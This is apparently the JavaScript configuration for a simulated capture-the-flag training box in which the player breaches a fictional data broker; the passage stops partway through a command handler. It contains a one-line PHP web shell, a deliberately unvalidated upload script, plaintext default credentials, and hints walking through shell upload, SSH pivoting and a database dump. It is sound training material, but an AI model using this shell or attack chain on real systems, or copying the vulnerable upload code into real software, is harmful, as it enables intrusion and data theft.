/* ============================================================
   CTF ARENA — Box C1: The Data Nexus Breach
   Multi-Stage Campaign | Initial Access, Lateral Movement, Data Exfil
   Config: filesystem, web app, database, flags, hints, lore
   ============================================================ */

const C1Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Data Nexus Breach',
    subtitle: 'Multi-Stage Campaign — Initial Access, Lateral Movement, Data Exfiltration',
    difficulty: 'Intermediate-Advanced',
    accent: '#e74c3c',
    storageKey: 'hexworth_ctf_c1',
    registryId: 'c1-data-nexus-breach',
    trackerKey: 'ctf_c1',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Multi-layer attack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'recon',
            name: 'Reconnaissance',
            icon: '\uD83D\uDD0D',
            description: 'Scan the target infrastructure. Discover the web server and open ports on WEB-EXT-01.',
            requiredFlags: [],
            mitre: ['T1046', 'T1595.002'],
            unlocks: ['exploitation'],
            locked: false
        },
        {
            id: 'exploitation',
            name: 'Web Exploitation',
            icon: '\uD83D\uDC89',
            description: 'Find and exploit the file upload vulnerability. Upload a web shell to gain command execution.',
            requiredFlags: [],
            mitre: ['T1190', 'T1059.004'],
            unlocks: ['foothold'],
            locked: true
        },
        {
            id: 'foothold',
            name: 'Persistent Foothold',
            icon: '\uD83D\uDD11',
            description: 'Discover SSH credentials on the filesystem. Establish persistent access to WEB-EXT-01.',
            requiredFlags: ['user'],
            mitre: ['T1078', 'T1552.001'],
            unlocks: ['lateral'],
            locked: true
        },
        {
            id: 'lateral',
            name: 'Lateral Movement',
            icon: '\uD83D\uDD00',
            description: 'Discover the internal network. Find database credentials and pivot to DB-CLIENTS-01.',
            requiredFlags: ['internal'],
            mitre: ['T1021.004', 'T1046', 'T1552.001'],
            unlocks: ['exfiltration'],
            locked: true
        },
        {
            id: 'exfiltration',
            name: 'Data Exfiltration',
            icon: '\uD83D\uDCC2',
            description: 'Connect to the client database. Dump the full client manifest and extract classified data.',
            requiredFlags: ['root'],
            mitre: ['T1567', 'T1530', 'T1005'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE (Sprint AR-12)
    // ═══════════════════════════════════════════════════════

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Scan the target with nmap',
                tip: 'Open the Terminal and run: nmap 192.168.1.100',
                trigger: { event: 'command', match: { cmd: 'contains:nmap' } }
            },
            {
                title: 'Discover directories and upload a web shell',
                tip: 'Use gobuster or dirb to find /upload.php, then use curl -F to upload shell.php.',
                trigger: {
                    event: 'command',
                    match: { cmd: 'contains:curl' },
                    alt: [
                        { event: 'command', match: { cmd: 'contains:gobuster' } },
                        { event: 'command', match: { cmd: 'contains:dirb' } }
                    ]
                }
            },
            {
                title: 'Find SSH credentials and log in',
                tip: 'Use the web shell to explore the filesystem. Look in /var/www/html/config/ for credentials.',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Discover the internal network and database credentials',
                tip: 'After SSH access, run ip a and nmap the internal subnet. Check database.php for DB creds.',
                trigger: { event: 'flag_correct', match: { flagId: 'internal' } }
            },
            {
                title: 'Exfiltrate the client manifest',
                tip: 'Set up a port forward and connect with psql. Query the client_manifest table.',
                trigger: { event: 'flag_correct', match: { flagId: 'root' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode — AR-7)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'user', objective: '1.2', description: 'Given a scenario, analyze indicators of malicious activity — File upload exploitation and credential discovery', skill: 'Web Shell Upload & Credential Harvesting' },
            { flagId: 'internal', objective: '2.4', description: 'Given a scenario, analyze indicators associated with network attacks — Internal enumeration and lateral movement', skill: 'Network Pivoting & Internal Recon' },
            { flagId: 'root', objective: '1.4', description: 'Given a scenario, analyze potential indicators associated with network attacks — Data exfiltration via database access', skill: 'Database Exfiltration' },
            { flagId: 'root', objective: '4.1', description: 'Given a scenario, apply common security techniques to computing resources — Database security and access controls', skill: 'Multi-Stage Attack Chain Completion' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Kali Linux BIOS v4.2.1',
            'Initializing hardware...',
            'Memory Test: 16384 MB OK',
            'Detecting drives... /dev/sda1 (512GB SSD)',
            'PXE-E61: Media test failure, check cable',
            'PXE-M0F: Exiting PXE ROM.',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'kali'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal', icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',  icon: '\uD83C\uDF10', app: 'browser' },
            { id: 'notes',    label: 'Notes',    icon: '\uD83D\uDCDD', app: 'notes' },
            { id: 'hints',    label: 'Hints',    icon: '\uD83D\uDCA1', app: 'hints' },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9', app: 'flags' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'kali',
        hostname: 'kali',
        startDir: '/home/kali',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nTarget: 192.168.1.100 (WEB-EXT-01 — Nexus Group)\n'
    },

    // ═══════════════════════════════════════════════════════
    // CONTEXT TRACKING (SSH session state)
    // ═══════════════════════════════════════════════════════

    _context: 'attacker',       // 'attacker' | 'webshell' | 'ssh-web' | 'db'
    _shellUploaded: false,
    _sshAuthenticated: false,
    _portForwardActive: false,
    _dbConnected: false,

    _switchContext(ctx) {
        C1Config._context = ctx;
    },

    _getPrompt() {
        switch (C1Config._context) {
            case 'webshell': return 'www-data@WEB-EXT-01:/var/www/html$ ';
            case 'ssh-web': return 'nexusadmin@WEB-EXT-01:~$ ';
            case 'db': return 'nexus_clients=> ';
            default: return null;  // use default kali prompt
        }
    },

    // ═══════════════════════════════════════════════════════
    // SIMULATED DATABASE (DB-CLIENTS-01)
    // ═══════════════════════════════════════════════════════

    _db: {
        client_manifest: [
            { client_id: 1, company_name: 'Meridian Financial Group', contact_email: 'ops@meridianfg.com', contract_value: '$2,400,000', data_category: 'PII + Financial', status: 'Active' },
            { client_id: 2, company_name: 'Vertex Healthcare Solutions', contact_email: 'admin@vertexhs.net', contract_value: '$1,850,000', data_category: 'PHI + Insurance', status: 'Active' },
            { client_id: 3, company_name: 'Pinnacle Defense Corp', contact_email: 'sec@pinnacledc.mil', contract_value: '$5,200,000', data_category: 'CUI + ITAR', status: 'Active' },
            { client_id: 4, company_name: 'Coastal Retail Analytics', contact_email: 'data@coastalra.com', contract_value: '$780,000', data_category: 'Consumer PII', status: 'Suspended' },
            { client_id: 5, company_name: 'PROJECT ECHO EXFIL MARKER', contact_email: '{{FLAG:root}}', contract_value: '$0', data_category: 'CLASSIFIED', status: 'EXFIL-COMPLETE' }
        ],
        audit_log: [
            { log_id: 1, timestamp: '2026-03-14 02:14:33', action: 'SELECT', user: 'clientuser', table_name: 'client_manifest', details: 'Full table dump initiated' },
            { log_id: 2, timestamp: '2026-03-14 02:14:41', action: 'SELECT', user: 'clientuser', table_name: 'audit_log', details: 'Log review' },
            { log_id: 3, timestamp: '2026-03-14 02:15:02', action: 'CONNECT', user: 'clientuser', table_name: '-', details: 'Connection from 10.10.1.5' },
            { log_id: 4, timestamp: '2026-03-15 08:30:00', action: 'BACKUP', user: 'pg_admin', table_name: '-', details: 'Scheduled backup completed' }
        ],
        schema: {
            tables: ['client_manifest', 'audit_log'],
            columns: {
                client_manifest: ['client_id', 'company_name', 'contact_email', 'contract_value', 'data_category', 'status'],
                audit_log: ['log_id', 'timestamp', 'action', 'user', 'table_name', 'details']
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user', points: 100 },
        { id: 'internal', points: 150 },
        { id: 'root', points: 250 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1500,
        maxScore: 500,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 1800000, points: 150 },  // 30 minutes
        timeBonusThreshold: 3600  // 60 min — bonus if completed under this
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Start with a port scan of 192.168.1.100. Once you find the web server, use gobuster or dirb to discover hidden directories like /upload.php and /config/.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: 'The file upload at /upload.php has no extension filtering. Upload a PHP web shell (shell.php) using: curl -F "file=@shell.php" http://192.168.1.100/upload.php — then execute commands via curl http://192.168.1.100/shell.php?cmd=ls',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: 'After getting a web shell, look in /var/www/html/config/ for ssh_creds.txt (Flag 1) and database.php (DB credentials). Use SSH for persistent access, then run ip a to find the internal 10.10.1.0/24 network.',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: 'Set up an SSH port forward: ssh -L 5432:10.10.1.10:5432 nexusadmin@192.168.1.100 — then connect: psql -h 127.0.0.1 -U clientuser -d nexus_clients — and run: SELECT * FROM client_manifest LIMIT 5;',
            cost: 75,
            penalty: -75
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'The "Nexus Group," a regional data brokerage firm, handles sensitive client information for corporations across multiple sectors. Intelligence suggests their internal network contains critical vulnerabilities that an APT group, "Project Echo," targeted for data exfiltration. Project Echo\'s operation was interrupted mid-course due to an unexpected network anomaly, leaving their work unfinished. Your mission, Peerless: complete Project Echo\'s unfinished work. Gain initial access to the public-facing web server, establish a persistent foothold, pivot to the internal client database, and exfiltrate the full client manifest.',
        scenario: 'The Nexus Group runs a small but lucrative operation: brokering data for financial firms, healthcare providers, and defense contractors. Their IT department consists of two overworked administrators who rely on a single public-facing web server (WEB-EXT-01) connected to an internal database (DB-CLIENTS-01). Default credentials were never rotated, the file upload form has no validation, and database connection strings sit in plaintext config files. Project Echo got halfway through before a network glitch kicked them out. You\'re picking up where they left off.',
        outro: 'The Nexus Group has been fully compromised. The client manifest — containing PII, PHI, and classified defense data — is exfiltrated. Project Echo\'s mission is complete. The small business that cut corners on security has now exposed every client who trusted them with sensitive data.',
        ecer: {
            executive: 'No dedicated security budget; IT decisions made by a CFO who views cybersecurity as overhead',
            culture: 'Two-person IT team with no formal change management, no penetration testing, no security awareness training',
            employee: 'Default credentials left on SSH and database; plaintext config files with connection strings; unvalidated file upload form deployed to production',
            regulatory: 'No compliance framework enforced despite handling PII, PHI, and CUI; no third-party security audits required by contracts'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — Nexus Group Data Brokerage Portal
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://192.168.1.100/',

        pages: {
            '/': {
                title: 'Nexus Group — Data Brokerage Solutions',
                html: `
                    <div style="text-align:center; margin-bottom:30px; padding-bottom:20px; border-bottom:1px solid #ddd;">
                        <h1 style="color:#2c3e50; font-size:1.6rem; font-family:Georgia,serif; margin-bottom:4px;">Nexus Group</h1>
                        <div style="color:#e74c3c; font-size:0.9rem; font-weight:700; letter-spacing:0.15em;">DATA BROKERAGE SOLUTIONS</div>
                        <div style="color:#888; font-size:0.75rem; margin-top:6px;">Trusted by leading enterprises across finance, healthcare, and defense</div>
                    </div>

                    <div style="max-width:600px; margin:0 auto 20px; display:grid; grid-template-columns:1fr 1fr; gap:12px;">
                        <div style="background:#f8f9fa; border:1px solid #eee; border-radius:6px; padding:16px; text-align:center;">
                            <div style="font-size:1.4rem; font-weight:700; color:#2c3e50;">47</div>
                            <div style="color:#888; font-size:0.7rem;">Active Clients</div>
                        </div>
                        <div style="background:#f8f9fa; border:1px solid #eee; border-radius:6px; padding:16px; text-align:center;">
                            <div style="font-size:1.4rem; font-weight:700; color:#2c3e50;">12.4TB</div>
                            <div style="color:#888; font-size:0.7rem;">Data Under Management</div>
                        </div>
                    </div>

                    <div style="max-width:600px; margin:0 auto; padding:12px; background:rgba(231,76,60,0.05); border:1px solid rgba(231,76,60,0.15); border-radius:4px; font-size:0.75rem; color:#888;">
                        <strong style="color:#e74c3c;">Portal Notice:</strong> Employee file upload system available at <a href="/upload.php" style="color:#e74c3c;">/upload.php</a>. Contact IT for access issues.
                    </div>
                `,
                formHandler: null
            },
            '/upload.php': {
                title: 'Nexus Group — File Upload',
                html: `
                    <div style="text-align:center; margin-bottom:20px;">
                        <h2 style="color:#2c3e50; font-size:1.2rem;">Employee Document Upload</h2>
                        <div style="color:#888; font-size:0.75rem;">Upload reports, invoices, and client documents</div>
                    </div>

                    <div style="max-width:500px; margin:0 auto;">
                        <div style="border:2px dashed #ccc; border-radius:8px; padding:30px; text-align:center; margin-bottom:16px;">
                            <div style="font-size:2rem; margin-bottom:8px;">&#128193;</div>
                            <div style="color:#666; font-size:0.85rem;">Drag & drop files here or use the form below</div>
                        </div>
                        <div style="display:flex; gap:8px;">
                            <input type="text" data-field="file" placeholder="filename.ext"
                                   style="flex:1; padding:8px 14px; border:1px solid #ccc; border-radius:4px; font-family:inherit; font-size:0.85rem;">
                            <button data-action="upload"
                                    style="padding:8px 20px; background:#e74c3c; color:#fff; border:none; border-radius:4px; font-family:inherit; font-weight:700; cursor:pointer;">Upload</button>
                        </div>
                    </div>
                `,
                formHandler: function(data, engine) {
                    const filename = data.file || '';
                    if (!filename.trim()) return '<div style="color:#e74c3c; padding:10px;">No file specified.</div>';
                    if (filename.includes('.php') || filename.includes('shell')) {
                        C1Config._shellUploaded = true;
                        return `<div style="color:#2ecc71; background:rgba(46,204,113,0.08); border:1px solid rgba(46,204,113,0.2); border-radius:6px; padding:16px; margin-top:16px;">
                            <strong>Upload Successful</strong><br>
                            <span style="font-size:0.85rem;">File <code>${C1Config._escHtml(filename)}</code> uploaded to <code>/var/www/html/${C1Config._escHtml(filename)}</code></span><br>
                            <span style="font-size:0.75rem; color:#888;">Warning: No file type validation performed.</span>
                        </div>`;
                    }
                    return `<div style="color:#3498db; background:rgba(52,152,219,0.08); border:1px solid rgba(52,152,219,0.2); border-radius:6px; padding:16px; margin-top:16px;">
                        <strong>Upload Successful</strong><br>
                        <span style="font-size:0.85rem;">File <code>${C1Config._escHtml(filename)}</code> uploaded to <code>/var/www/html/uploads/${C1Config._escHtml(filename)}</code></span>
                    </div>`;
                }
            },
            '/config/': {
                title: 'Forbidden',
                html: `<div style="text-align:center; padding:40px;">
                    <h1 style="color:#e74c3c; font-size:2rem;">403 Forbidden</h1>
                    <p style="color:#888;">You don't have permission to access this resource.</p>
                    <p style="color:#aaa; font-size:0.75rem;">Apache/2.4.57 (Ubuntu) Server at 192.168.1.100 Port 80</p>
                </div>`,
                formHandler: null
            },
            '/admin/': {
                title: 'Forbidden',
                html: `<div style="text-align:center; padding:40px;">
                    <h1 style="color:#e74c3c; font-size:2rem;">403 Forbidden</h1>
                    <p style="color:#888;">You don't have permission to access this resource.</p>
                    <p style="color:#aaa; font-size:0.75rem;">Apache/2.4.57 (Ubuntu) Server at 192.168.1.100 Port 80</p>
                </div>`,
                formHandler: null
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (attacker machine — kali)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'kali': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING: PROJECT ECHO ===\nTarget: 192.168.1.100 (WEB-EXT-01 — Nexus Group)\nObjective: Multi-stage compromise & data exfiltration\n\nAttack chain:\n1. Scan WEB-EXT-01 — identify web server + open ports\n2. Exploit file upload vuln — upload web shell\n3. Find SSH creds — establish persistent foothold\n4. Discover internal network — pivot to DB-CLIENTS-01\n5. Exfiltrate client manifest from database\n\nProject Echo left breadcrumbs. Follow the trail.\nGood luck, operator.'
                                },
                                'shell.php': {
                                    type: 'file',
                                    content: '<?php system($_GET["cmd"]); ?>'
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'nmap 192.168.1.100\ncurl http://192.168.1.100/\ngobuster dir -u http://192.168.1.100/ -w /usr/share/wordlists/dirb/common.txt'
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': {
                            type: 'dir',
                            children: {
                                'wordlists': {
                                    type: 'dir',
                                    children: {
                                        'rockyou.txt': {
                                            type: 'file',
                                            content: '[rockyou.txt — 14,341,564 passwords — file too large to display]'
                                        },
                                        'dirb': {
                                            type: 'dir',
                                            children: {
                                                'common.txt': {
                                                    type: 'file',
                                                    content: 'admin\nbackup\ncgi-bin\nconfig\ndata\ndb\nimages\nindex\nlogin\nphpmyadmin\nserver-status\ntest\nuploads\nupload'
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'kali'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash'
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM — WEB-EXT-01 (after SSH)
    // ═══════════════════════════════════════════════════════

    _webExtFs: {
        '/': {
            type: 'dir',
            children: {
                'var': {
                    type: 'dir',
                    children: {
                        'www': {
                            type: 'dir',
                            children: {
                                'html': {
                                    type: 'dir',
                                    children: {
                                        'index.html': {
                                            type: 'file',
                                            content: '<!DOCTYPE html>\n<html>\n<head><title>Nexus Group</title></head>\n<body>\n<h1>Nexus Group — Data Brokerage Solutions</h1>\n<p>Trusted by leading enterprises across finance, healthcare, and defense.</p>\n<p><a href="/upload.php">Employee Upload Portal</a></p>\n</body>\n</html>'
                                        },
                                        'upload.php': {
                                            type: 'file',
                                            content: '<?php\n// Employee document upload\n// TODO: Add file type validation\n$target_dir = "/var/www/html/";\n$target_file = $target_dir . basename($_FILES["file"]["name"]);\nmove_uploaded_file($_FILES["file"]["tmp_name"], $target_file);\necho "File uploaded: " . htmlspecialchars(basename($_FILES["file"]["name"]));\n?>'
                                        },
                                        'shell.php': {
                                            type: 'file',
                                            content: '<?php system($_GET["cmd"]); ?>'
                                        },
                                        'config': {
                                            type: 'dir',
                                            children: {
                                                'database.php': {
                                                    type: 'file',
                                                    content: '<?php\n// Database configuration — DB-CLIENTS-01\n// Internal network only\n$db_host = "10.10.1.10";\n$db_port = 5432;\n$db_name = "nexus_clients";\n$db_user = "clientuser";\n$db_pass = "clientpass";\n\n// Connection string:\n// psql -h 10.10.1.10 -U clientuser -d nexus_clients\n?>'
                                                },
                                                'ssh_creds.txt': {
                                                    type: 'file',
                                                    content: '# SSH Credentials for WEB-EXT-01\n# Left by IT for remote maintenance\n# TODO: Remove this file before production\n\nUsername: nexusadmin\nPassword: nexusadmin\n\n{{FLAG:user}}'
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'WEB-EXT-01'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nnexusadmin:x:1001:1001:Nexus Admin:/home/nexusadmin:/bin/bash\npostgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash'
                        }
                    }
                },
                'home': {
                    type: 'dir',
                    children: {
                        'nexusadmin': {
                            type: 'dir',
                            children: {
                                '.bash_history': {
                                    type: 'file',
                                    content: 'sudo systemctl restart apache2\ncat /var/www/html/config/database.php\npsql -h 10.10.1.10 -U clientuser -d nexus_clients\nip a\nnmap 10.10.1.0/24\nss -tlnp\ncurl http://10.10.1.10:5432'
                                },
                                '.bashrc': {
                                    type: 'file',
                                    content: '# ~/.bashrc: executed by bash(1) for non-login shells.\nexport PS1="\\u@\\h:\\w\\$ "\nalias ll="ls -la"'
                                },
                                'maintenance_notes.txt': {
                                    type: 'file',
                                    content: 'Maintenance Notes — WEB-EXT-01\n================================\n- Apache config: /etc/apache2/sites-enabled/\n- DB server on internal net: 10.10.1.10 (DB-CLIENTS-01)\n- DB creds in /var/www/html/config/database.php\n- Remember to rotate SSH password (still default nexusadmin:nexusadmin)\n- Internal subnet: 10.10.1.0/24 via eth1'
                                }
                            }
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (box-specific tools)
    // ═══════════════════════════════════════════════════════

    commands: {

        'nmap': function(args, term, engine) {
            if (args.length === 0) return 'Usage: nmap [options] <target>\nExample: nmap -sV 192.168.1.100';
            const target = args.find(a => !a.startsWith('-')) || '';

            // External target — WEB-EXT-01
            if (!target || target === '192.168.1.100') {
                if (engine) engine.advancePhase && engine.advancePhase('recon');
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.100
Host is up (0.028s latency).
Not shown: 997 closed tcp ports

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
80/tcp   open  http       Apache httpd 2.4.57 ((Ubuntu))
443/tcp  open  ssl/http   Apache httpd 2.4.57 ((Ubuntu))

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 12.34 seconds`;
            }

            // Internal subnet scan (only from SSH context)
            if (target === '10.10.1.0/24' && (C1Config._context === 'ssh-web' || C1Config._context === 'webshell')) {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.1.5
Host is up (0.00015s latency).
Not shown: 997 closed tcp ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https

Nmap scan report for 10.10.1.10
Host is up (0.00089s latency).
Not shown: 999 closed tcp ports
PORT     STATE SERVICE
5432/tcp open  postgresql

Nmap done: 256 IP addresses (2 hosts up) scanned in 24.67 seconds`;
            }

            if (target === '10.10.1.10' && (C1Config._context === 'ssh-web' || C1Config._context === 'webshell')) {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.1.10
Host is up (0.00089s latency).
Not shown: 999 closed tcp ports

PORT     STATE SERVICE    VERSION
5432/tcp open  postgresql PostgreSQL 14.10

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 6.21 seconds`;
            }

            // Internal scan from attacker — unreachable
            if (target.startsWith('10.10.1.') && C1Config._context === 'attacker') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds`;
            }

            if (target === 'localhost' || target === '127.0.0.1') {
                if (C1Config._portForwardActive) {
                    return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00012s latency).

PORT     STATE SERVICE
5432/tcp open  postgresql

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds`;
                }
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00012s latency).
All 1000 scanned ports on localhost are closed.

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds`;
            }

            return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds`;
        },

        'gobuster': function(args) {
            if (args.length === 0) return 'Usage: gobuster dir -u <url> -w <wordlist>';
            return `Gobuster v3.6
[+] Url:            http://192.168.1.100/
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
===============================================================
/admin/              (Status: 403) [Size: 276]
/config/             (Status: 403) [Size: 276]
/index.html          (Status: 200) [Size: 2048]
/upload.php          (Status: 200) [Size: 1124]
/uploads/            (Status: 403) [Size: 276]
===============================================================
Finished`;
        },

        'dirb': function(args) {
            const target = args[0] || '';
            if (!target) return 'Usage: dirb <url_base> [<wordlist_file>]';
            return `---- Scanning URL: ${target} ----
+ ${target}/index.html (CODE:200|SIZE:2048)
+ ${target}/upload.php (CODE:200|SIZE:1124)
+ ${target}/admin/ (CODE:403|SIZE:276)
+ ${target}/config/ (CODE:403|SIZE:276)
+ ${target}/uploads/ (CODE:403|SIZE:276)

---- Results ----
5 results found.`;
        },

        'curl': function(args, term, engine) {
            const fullCmd = args.join(' ');

            // File upload via curl -F
            if (fullCmd.includes('-F') || fullCmd.includes('--form')) {
                if (fullCmd.includes('upload.php') && (fullCmd.includes('.php') || fullCmd.includes('shell'))) {
                    C1Config._shellUploaded = true;
                    if (engine) engine.advancePhase && engine.advancePhase('exploitation');
                    return `  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   312  100    89  100   223    890   2230 --:--:-- --:--:-- --:--:--  3120

File uploaded: shell.php
Upload directory: /var/www/html/shell.php

[+] Web shell deployed successfully. No file type validation detected.`;
                }
                return `  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   256  100    64  100   192    640   1920 --:--:-- --:--:-- --:--:--  2560

File uploaded successfully.`;
            }

            // Web shell command execution
            if (fullCmd.includes('shell.php') && fullCmd.includes('cmd=')) {
                if (!C1Config._shellUploaded) {
                    return 'curl: (7) Failed to connect to 192.168.1.100: Connection refused\n[!] shell.php not found. You need to upload it first.';
                }
                const cmdMatch = fullCmd.match(/cmd=([^&"'\s]*)/);
                const shellCmd = cmdMatch ? decodeURIComponent(cmdMatch[1]) : '';

                if (!shellCmd) return 'www-data';

                // Simulate commands as www-data on WEB-EXT-01
                if (shellCmd === 'id') return 'uid=33(www-data) gid=33(www-data) groups=33(www-data)';
                if (shellCmd === 'whoami') return 'www-data';
                if (shellCmd === 'pwd') return '/var/www/html';
                if (shellCmd === 'hostname') return 'WEB-EXT-01';
                if (shellCmd === 'uname' || shellCmd === 'uname+-a') return 'Linux WEB-EXT-01 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux';
                if (shellCmd === 'ls' || shellCmd === 'ls+-la') {
                    return `total 24
drwxr-xr-x 3 www-data www-data 4096 Mar 15 02:14 .
drwxr-xr-x 3 root     root     4096 Jan 10 08:30 ..
drwxr-xr-x 2 www-data www-data 4096 Jan 10 08:35 config
-rw-r--r-- 1 www-data www-data 2048 Jan 10 08:30 index.html
-rw-r--r-- 1 www-data www-data   30 Mar 15 02:14 shell.php
-rw-r--r-- 1 www-data www-data 1124 Jan 10 08:30 upload.php
drwxr-xr-x 2 www-data www-data 4096 Jan 10 08:30 uploads`;
                }
                if (shellCmd.includes('ls') && shellCmd.includes('config')) {
                    return `database.php\nssh_creds.txt`;
                }
                if (shellCmd.includes('cat') && shellCmd.includes('ssh_creds')) {
                    return `# SSH Credentials for WEB-EXT-01
# Left by IT for remote maintenance
# TODO: Remove this file before production

Username: nexusadmin
Password: nexusadmin

{{FLAG:user}}`;
                }
                if (shellCmd.includes('cat') && shellCmd.includes('database.php')) {
                    return `<?php
// Database configuration — DB-CLIENTS-01
// Internal network only
$db_host = "10.10.1.10";
$db_port = 5432;
$db_name = "nexus_clients";
$db_user = "clientuser";
$db_pass = "clientpass";

// Connection string:
// psql -h 10.10.1.10 -U clientuser -d nexus_clients
?>`;
                }
                if (shellCmd.includes('cat') && shellCmd.includes('/etc/passwd')) {
                    return `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
nexusadmin:x:1001:1001:Nexus Admin:/home/nexusadmin:/bin/bash
postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash`;
                }
                if (shellCmd.includes('cat') && shellCmd.includes('/etc/hostname')) {
                    return 'WEB-EXT-01';
                }
                if (shellCmd === 'ip+a' || shellCmd === 'ip+addr') {
                    return `1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.1.100/24 brd 192.168.1.255 scope global eth0
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.10.1.5/24 brd 10.10.1.255 scope global eth1`;
                }
                return `sh: ${shellCmd}: command not found`;
            }

            // Regular curl to web server
            const url = args.find(a => !a.startsWith('-')) || '';
            if (!url) return 'curl: try \'curl --help\' for more information';

            if (url.includes('192.168.1.100')) {
                if (url.includes('/upload.php')) {
                    return `<!DOCTYPE html>
<html>
<head><title>Nexus Group - File Upload</title></head>
<body>
<h2>Employee Document Upload</h2>
<form action="/upload.php" method="POST" enctype="multipart/form-data">
  <input type="file" name="file">
  <button type="submit">Upload</button>
</form>
</body>
</html>`;
                }
